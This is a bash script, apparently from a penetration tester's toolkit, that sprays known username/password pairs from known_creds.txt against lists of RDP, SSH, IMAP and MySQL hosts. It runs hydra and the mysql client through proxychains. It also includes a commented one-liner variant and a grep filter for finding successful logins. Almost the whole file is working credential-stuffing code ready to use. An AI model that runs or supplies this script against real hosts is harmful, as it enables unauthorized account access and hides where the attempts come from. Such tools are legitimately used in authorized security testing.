#!/bin/bash -u
# Eliot Roxbergh 2024
#
# Bruteforce credentials (ugly script)
# It simple does this: for each entry in a file of format "user passw0rd", run a command
#   such as hydra -l "user" -p "passw0rd"

# Tip: use this oneliner to try all known_creds on hosts:
#
#lines=$(wc -l known_creds.txt| cut -d' ' -f1);for i in {1..$lines}; do echo $i; echo; proxychains hydra -l "$(cat known_creds.txt | head -n $i | tail -n1 | cut -d' ' -f1)" -p "$(cat known_creds.txt | head -n $i | tail -n1 | cut -d' ' -f2)"  -M tmp_rdp_hosts.txt -t 1 rdp -I;done
#lines=$(wc -l known_creds.txt| cut -d' ' -f1);for i in "$(cat known_creds.txt)"; do echo $i; done

echo Example:
echo ./try_all_known_creds.sh imap tmp_email_hosts.txt
echo ./try_all_known_creds.sh rdp  tmp_rdp_hosts.txt
echo ./try_all_known_creds.sh ssh  tmp_ssh_hosts.txt
sleep 2




if [ $# -gt 0 ];then
        METHOD="$1"
else
        echo "Specify method as first arg (e.g. rdp)"
        echo
        echo
        hydra -h
        exit
fi


if [ $# -gt 1 ];then
        IP_FILE="$2"
else
        IP_FILE="tmp_rdp_hosts.txt"
fi


# Special case for mysql
if [ "$METHOD" = "mysql" ]; then
        IP="$IP_FILE"
        cat known_creds.txt | while read line; do proxychains mysql -u "$(echo "$line" | cut -d' ' -f1)" -p"$(echo "$line" | cut -d' ' -f2)" -h $IP; done
        exit 0
fi

#GREP interesting: | grep -e '\[rdp\]' -e 'valid password' -e 'account on' -e 'login:.*password:.*'
# imap add domain on username, e.g.: @relia.com ?
cat known_creds.txt | while read line; do proxychains hydra -l "$(echo "$line" | cut -d' ' -f1)" -p "$(echo "$line" | cut -d' ' -f2)"  -M $IP_FILE -t 1 "$METHOD" -I; done

